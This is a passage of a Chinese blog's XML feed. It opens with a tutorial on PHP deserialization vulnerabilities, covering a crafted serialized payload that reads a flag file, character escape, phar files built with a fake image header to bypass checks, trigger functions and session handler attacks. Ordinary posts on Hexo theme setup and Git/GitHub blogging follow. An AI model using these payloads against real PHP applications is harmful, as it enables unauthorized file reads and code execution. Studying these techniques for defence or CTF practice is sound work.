src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/7.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">O:5:&quot;Hello&quot;:1:&#123;S:4:&quot;%00*%00a&quot;;S:14:&quot;file:&#x2F;&#x2F;&#x2F;fl%25%36%31g&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h3><p>反序列化字符串都是以一<code>&quot;;&#125;</code>结束的，所以如果我们把<code>&quot;;&#125;</code>带入需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就丢弃了。</p><p>在反序列化的时候php会根据s所指定的字符长度去读取后边的字符,我们可以根据需求指定s的长度。</p><p>例：字符逃逸将age从13变成35。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/8.png"></p><h3 id="PHar反序列化"><a href="#PHar反序列化" class="headerlink" title="PHar反序列化"></a>PHar反序列化</h3><p>Phar反序列化可以在不使用php函数unserialize（）的前提下，进行php反序列化漏洞。</p><p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。<br>例如常见的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include(&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&#39;);</span><br><span class="line">include(&#39;data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxxxxxxxxxx&#39;);</span><br></pre></td></tr></table></figure><p><code>phar://</code>也是流包装的一种</p><h4 id="phar原理"><a href="#phar原理" class="headerlink" title="phar原理"></a>phar原理</h4><p>phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><p>phar文件类似zip和jar，它将PHP文件打包成一个文件然后PHP可以在不解压的情况下去访问这个包里面的php，并执行。</p><h4 id="phar文件标识"><a href="#phar文件标识" class="headerlink" title="phar文件标识"></a>phar文件标识</h4><p>a stub</p><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><p>manifest</p><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><p>contents</p><p>被压缩文件的内容。</p><p>signature</p><p>签名，发在文件末尾。</p><h4 id="构建phar文件"><a href="#构建phar文件" class="headerlink" title="构建phar文件"></a>构建phar文件</h4><p>将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。不同的php.ini文件对应着phpstudy的不同版本。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/9.png"></p><p>执行下面的文本生成phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar，文件名可自己设置，例·：test.php</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $o -&gt; data=<span class="string">&#x27;hu3sky&#x27;</span>;<span class="comment">//类中有一个属性data,属性值为hu3sky</span></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//该文本的文件名为phar.php</span></span><br></pre></td></tr></table></figure><p>修改php-5.5.38文件，可以看到成功执行，生成phar文件。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/10.png"></p><h4 id="打开phar文件"><a href="#打开phar文件" class="headerlink" title="打开phar文件"></a>打开phar文件</h4><p>可以看到该phar文件由四部分组成，文件标识（__HALT_COMPILER()）</p><p>manifest（反序列化内容） ，压缩文件内容，签名。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/11.png"></p><h4 id="利用phar文件"><a href="#利用phar文件" class="headerlink" title="利用phar文件"></a>利用phar文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当用phar:&#x2F;&#x2F;访问phar文件时，会触发反序列化，会触发魔法函数。</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/12.jpg"></p><p>当在setStub添加图片文件头，可以绕过图片头检测。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/13.png"></p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>只要phar://协议解析文件的时候，就会造成序列化的问题，所以文件操作的函数都可以触发这种序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">fileatime / filectime / filemtime</span><br><span class="line">stat / fileinode / fileowner / filegroup / fileperms</span><br><span class="line">file / file_get_contents / readfile / `fopen``</span><br><span class="line">file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable</span><br><span class="line">parse_ini_file</span><br><span class="line">unlink</span><br><span class="line">copy</span><br><span class="line"><span class="keyword">include</span></span><br><span class="line">扩展</span><br><span class="line">exif_thumbnail</span><br><span class="line">exif_imagetype</span><br><span class="line">imageloadfont</span><br><span class="line">imagecreatefrom***</span><br><span class="line">hash_hmac_file</span><br><span class="line">hash_file</span><br><span class="line">hash_update_file</span><br><span class="line">md5_file</span><br><span class="line">sha1_file</span><br><span class="line">get_meta_tags</span><br><span class="line">get_headers</span><br><span class="line">getimagesize</span><br><span class="line">getimagesizefromstring</span><br></pre></td></tr></table></figure><p>绕过图片头检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;&#125;</span><br><span class="line">$jpeg_header_size = </span><br><span class="line"><span class="string">&quot;图片&quot;</span>;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;setStub($jpeg_header_size.<span class="string">&quot; __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><h4 id="sseion的简单介绍"><a href="#sseion的简单介绍" class="headerlink" title="sseion的简单介绍"></a>sseion的简单介绍</h4><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/14.png"></p><p><strong>PHP session 变量用于存储有关用户会话的信息，或更改用户会话的设置。Session 变量保存的信息是单一用户的，并且可供应用程序中的所有页面使用。</strong></p><p>Session 的工作机制是：为每个访问者创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，亦或通过 URL 进行传导。</p><p><strong>开启session</strong></p><p>在您把用户信息存储到 PHP session 中之前，首先必须启动会话。</p><p><strong>注释：</strong>session_start() 函数必须位于 <html> 标签之前：</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/15.png"></p><p><strong>终结session</strong></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/23.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/16.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/17.png"></p><h4 id="开启session并执行文件"><a href="#开启session并执行文件" class="headerlink" title="开启session并执行文件"></a>开启session并执行文件</h4><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/18.png"></p><p><strong>删除文件</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2017/12/16</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">session_start();<span class="comment">// 打开session</span></span><br><span class="line">$_SESSION[<span class="string">&quot;demo1&quot;</span>] = <span class="string">&quot;default_1&quot;</span>;</span><br><span class="line">var_dump(session_name());</span><br><span class="line"><span class="comment">//session的销毁</span></span><br><span class="line">session_destroy();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="session存储方式"><a href="#session存储方式" class="headerlink" title="session存储方式"></a>session存储方式</h4><p>PHP中的session中的文件内容默认是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/24.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以如下代码为例，查看不同存储引擎存储的结果</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);<span class="comment">//这里换不同的存储引擎</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&#x27;username&#x27;</span>] = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/19.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20.png"></p><h4 id="有-SESSION赋值的反序列化"><a href="#有-SESSION赋值的反序列化" class="headerlink" title="有$_SESSION赋值的反序列化"></a>有$_SESSION赋值的反序列化</h4><p>当网站序列化存储 <code>session</code> 与反序列化读取 <code>session</code> 的方式不同时，就可能导致 <code>session</code> 反序列化漏洞的产生。 一般都是以 <code>php_serialize</code> 序列化存储 <code>session</code>， 以 <code>PHP</code> 反序列化读取 <code>session</code>，造成反序列化攻击。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/21.png"></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PHP session 常见利用点 - 先知社区  https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;8221#toc-5</span><br><span class="line"></span><br><span class="line">反序列化 | Welcome eeknight.top  http:&#x2F;&#x2F;eeknight.top&#x2F;2020&#x2F;10&#x2F;03&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97&#x2F;</span><br><span class="line"></span><br><span class="line">反序列化 | shasha  https:&#x2F;&#x2F;zzdooo.gitee.io&#x2F;sddoo&#x2F;2020&#x2F;10&#x2F;02&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&#x2F;</span><br><span class="line"></span><br><span class="line">初探phar:&#x2F;&#x2F; - 先知社区  https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2715</span><br><span class="line"></span><br><span class="line">原理+实践掌握(PHP反序列化和Session反序列化) - 先知社区  https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7366#toc-4</span><br><span class="line"></span><br><span class="line">Phar反序列化拓展攻击学习笔记 | Xiao Leung&#39;s Blog  http:&#x2F;&#x2F;www.plasf.cn&#x2F;2019&#x2F;12&#x2F;12&#x2F;Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h3&gt;&lt;p&gt;把对象转换为字节序列的过程称为对象的序列化&lt;strong&gt;；&lt;/strong&gt;把字节序列恢复为对象的过程称为对象的反序列化。</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>主题配置</title>
    <link href="http://www.yoyo2tong.xyz/2020/09/17/theme/"/>
    <id>http://www.yoyo2tong.xyz/2020/09/17/theme/</id>
    <published>2020-09-17T15:14:01.842Z</published>
    <updated>2021-03-21T07:05:04.950Z</updated>
    
    <content type="html"><![CDATA[<h4 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;theme-next&#x2F;hexo-theme-next</span><br></pre></td></tr></table></figure><p>下载主题zip包并下载，解压放在博客根目录/themes 重命名文件夹为next。</p><p>或          博客根目录打开命令行，输入命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;theme-next&#x2F;hexo-theme-next themes&#x2F;next</span><br></pre></td></tr></table></figure><h4 id="修改语言"><a href="#修改语言" class="headerlink" title="修改语言"></a>修改语言</h4><p>修改博客配置文件下的language项为zh-CN</p><p>看一下主题文件夹内的languange文件夹中中文的配置文件叫什么名字，Next主题有些版本的叫zh-Hans </p><h4 id="修改菜单及创建分类页"><a href="#修改菜单及创建分类页" class="headerlink" title="修改菜单及创建分类页"></a>修改菜单及创建分类页</h4><p>修改主题配置文件下的menu项，把tags项前面的#去掉就行。</p><p>接着在输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure><p>新建出标签页。</p><p>同样，在开启分类页的时候要输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure><p>来新建出分类页。</p><h4 id="修改主题风格"><a href="#修改主题风格" class="headerlink" title="修改主题风格"></a>修改主题风格</h4><p>Next自带四种主题风格，可以在主题配置文件搜索Scheme项，将需要的风格前的#去掉，只开启一个风格。</p><h4 id="设置头像"><a href="#设置头像" class="headerlink" title="设置头像"></a>设置头像</h4><p>在线图片设置：编辑主题配置文件，修改字段avatar中的url值，设置成头像的链接地址，可以设置成在线的图片地址。</p><p>本地设置：放置在source/images目录下，设置url为：/images/图片名</p><p>这个rounded项可以设置头像为圆形，设置为ture后会自动根据头像的尺寸将头像变化为圆形或者椭圆。</p><p>设置opacity的值控制头像的透明度，值为0-1</p><h4 id="实现全站及文章字数统计及阅读时长"><a href="#实现全站及文章字数统计及阅读时长" class="headerlink" title="实现全站及文章字数统计及阅读时长"></a>实现全站及文章字数统计及阅读时长</h4><p>跟目录命令行运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-symbols-count-time --svae</span><br></pre></td></tr></table></figure><p>博客配置文件底部添加如下内容，保存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">    symbols : true</span><br><span class="line">    time:true</span><br><span class="line">    total_symbols:true</span><br><span class="line">    total_time:true</span><br></pre></td></tr></table></figure><h4 id="修改github域名"><a href="#修改github域名" class="headerlink" title="修改github域名"></a>修改github域名</h4><h5 id="域名解析到github"><a href="#域名解析到github" class="headerlink" title="域名解析到github"></a>域名解析到github</h5><p>（1）先添加一个CNAME记录类型，主机记录写@，后面记录值写上你的<a href="http://xxxx.github.io/">http://xxxx.github.io</a><br>（2）再添加一个CNAME记录类型，主机记录写www，后面记录值也是<a href="http://xxxx.github.io/">http://xxxx.github.io</a></p><p>这样别人用www和不用www都能访问你的网站（其实www的方式，会先解析成<a href="http://xxxx.github.io,然后根据cname再变成http//xxx.com%EF%BC%8C%E5%8D%B3%E4%B8%AD%E9%97%B4%E6%98%AF%E7%BB%8F%E8%BF%87%E4%B8%80%E6%AC%A1%E8%BD%AC%E6%8D%A2%E7%9A%84%EF%BC%89">http://xxxx.github.io，然后根据CNAME再变成http://xxx.com，即中间是经过一次转换的）</a></p><p>也可以使用A记录，A记录是直接解析到空间的ip地址。</p><p>CNAME是解析到别名。</p><h5 id="ping域名"><a href="#ping域名" class="headerlink" title="ping域名"></a>ping域名</h5><p>ping是对网络目标进行检测的基本命令工具。</p><p>但域名和IP并不是一一对应的关系</p><p>ping域名，可以得到一个IP为目标</p><p>但是ping ip 得到的是整个服务器 并不是某一个域名<img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDJDIDADFCPDDDIDGCOHAGOGH"></p><p>直接ping域名没有成功，ping www.+域名成功了。</p><p>判断域名有没有解析成功，在DOS系统界面里输入ping+空格+网址。</p><p>可以看到目标解析IP地址和相应的网址响应时间，即说明解析成功。</p><h5 id="github修改文件"><a href="#github修改文件" class="headerlink" title="github修改文件"></a>github修改文件</h5><p>修改CNAME文件</p><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDJDIDADGCPDDDIDICOHAGOGH"></p><p>再修改custom domain为自己的域名</p><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDJDIDADHCPDDDIDHCOHAGOGH"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;下载地址&quot;&gt;&lt;a href=&quot;#下载地址&quot; class=&quot;headerlink&quot; title=&quot;下载地址&quot;&gt;&lt;/a&gt;下载地址&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>搭建博客</title>
    <link href="http://www.yoyo2tong.xyz/2020/09/12/blog/"/>
    <id>http://www.yoyo2tong.xyz/2020/09/12/blog/</id>
    <published>2020-09-12T12:57:41.723Z</published>
    <updated>2021-03-21T08:05:07.071Z</updated>
    
    <content type="html"><![CDATA[<h2 id="github搭建博客"><a href="#github搭建博客" class="headerlink" title="github搭建博客"></a>github搭建博客</h2><p>使用github来托管项目文件</p><p>仓库：即你的项目，你想在github上开源一个项目，就必须要新建一个Repository。</p><p>创建项目  项目名：用户名.github.io</p><p>搭建步骤：创建个人站点–新建仓库（注:仓库名必须是【用户名.github.io】）</p><p>个人站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;用户名.github.io</span><br></pre></td></tr></table></figure><h3 id="安装node"><a href="#安装node" class="headerlink" title="安装node"></a>安装node</h3><p>打开node官网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;nodejs.org&#x2F;en&#x2F;</span><br></pre></td></tr></table></figure><p>下载安装，点击Add to PATH选项，添加到环境变量</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/1.png"></p><p>则安装完成。</p><p>安装完node后，就可以使用npm命令安装Hexo，输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p>通过git管理github托管项目代码</p><p>git是一个免费，开源的版本控制软件。</p><p><strong>git基本工作流程</strong></p><p>工作区（Working Directory） 添加，编辑，修改文件等</p><p>暂存区  暂存已经修改的文件最后统一提交到git仓库中</p><p>Git Repository（Git 仓库） 最终确定的文件保存到仓库，成为一个新的版本，并且对他人可见</p><p>a.  查看工作区和暂存区的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><p>b. 把工作区的内容添加到暂存区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add 文件名</span><br></pre></td></tr></table></figure><p>c. 将暂存区的文件提交到仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;提交描述&quot;</span><br></pre></td></tr></table></figure><h3 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h3><p>在文件目录下创建文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir 文件名</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/2.png"></p><p>在文件内初始化git（创建git仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd test</span><br><span class="line">git init</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/3.png"></p><p>c，向仓库添加文件</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/4.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/5.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/6.png"></p><p>删除工作区文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf 1.php</span><br></pre></td></tr></table></figure><p>删除暂存区文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm 1.php</span><br></pre></td></tr></table></figure><p>提交操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &#39;提交描述&#39;</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/7.png"></p><h3 id="Git初始化及仓库创建和操作"><a href="#Git初始化及仓库创建和操作" class="headerlink" title="Git初始化及仓库创建和操作"></a>Git初始化及仓库创建和操作</h3><p>设置用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &#39;用户名&#39;</span><br></pre></td></tr></table></figure><p>设置用户名邮箱</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email &#39;用户邮箱&#39;</span><br></pre></td></tr></table></figure><p>查看设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config -list</span><br></pre></td></tr></table></figure><h3 id="Git管理远程仓库"><a href="#Git管理远程仓库" class="headerlink" title="Git管理远程仓库"></a>Git管理远程仓库</h3><p>使用远程仓库的目的</p><p>作用:备份，实现代码共享集中化管理</p><p>将本地仓库同步到git远程仓库中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></table></figure><p>git克隆操作</p><p>目的：将远程仓库（对应的项目）复制到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone 仓库地址</span><br></pre></td></tr></table></figure><h3 id="githubSSH配置"><a href="#githubSSH配置" class="headerlink" title="githubSSH配置"></a>githubSSH配置</h3><p>GitHub配置SSH Key的目的是为了帮助我们在通过git提交代码时，不需要繁琐的验证过程，简化操作流程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;xiangshuo1992&#x2F;preload.git</span><br><span class="line">git@github.com:xiangshuo1992&#x2F;preload.git</span><br></pre></td></tr></table></figure><p>这两个地址展示的是同一个项目，前者是https url 直接有效网址打开，但是用户每次通过git提交的时候都要输入用户名和密码；后者是SSH URL，在通过git提交代码时，不需要验证过程。</p><p>检测是否存在SSH KEY</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/8.png"></p><p>如果没有，则需要生成一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;Github的注册邮箱&quot;</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/9.png"></p><h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><p>Hexo就是我们的个人博客网站的框架。这里需要自己在电脑常里创建一个文件夹，可以命名为Blog，Hexo框架与以后你自己发布的网页都在这个文件夹中。</p><p>在创建的文件夹命令行下，使用npm命令安装Hexo，输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 